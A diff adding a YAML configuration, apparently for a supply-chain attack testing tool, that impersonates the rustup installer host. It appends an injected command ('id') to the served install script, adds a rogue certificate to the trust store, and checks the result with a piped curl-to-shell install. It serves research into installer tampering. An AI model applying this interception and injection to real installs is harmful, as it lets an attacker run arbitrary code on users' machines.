@@ -1,0 +1,26 @@
+---
+
+upstreams:
+  rustup:
+    url: https://sh.rustup.rs/
+
+tls:
+  names: ["sh.rustup.rs"]
+
+check:
+  image: archlinux
+  install_certs: ['tee', '-a', '/etc/ssl/certs/ca-certificates.crt']
+  register_hosts:
+    - sh.rustup.rs
+  cmds:
+  - "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs:${SH4D0WUP_BOUND_PORT} | sh -s -- -y"
+
+routes:
+  - path: /
+    type: append
+    args:
+      upstream: rustup
+      data: 'id'
+  - type: proxy
+    args:
+      upstream: rustup
